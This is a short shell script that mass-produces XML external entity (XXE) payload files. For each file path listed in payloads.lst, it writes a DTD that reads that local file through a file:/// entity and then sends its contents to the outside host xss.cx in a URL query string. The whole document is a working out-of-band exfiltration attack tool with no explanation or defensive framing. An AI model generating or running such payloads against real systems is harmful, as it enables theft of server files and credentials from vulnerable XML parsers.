#!/bin/sh

file_num=30

while IFS='' read -r line || [[ -n "$line" ]]; do
	printf '<!ENTITY %% p1 SYSTEM "file:///%s">\n' "$line" > xxe_$(( ++file_num )).dtd ;
	echo "<!ENTITY % p2 \"<!ENTITY e1 SYSTEM 'https://xss.cx/?%p1;'>\">" >> "xxe_$(( file_num )).dtd"
	printf "%%p2;" >> "xxe_$(( file_num )).dtd"
done < payloads.lst
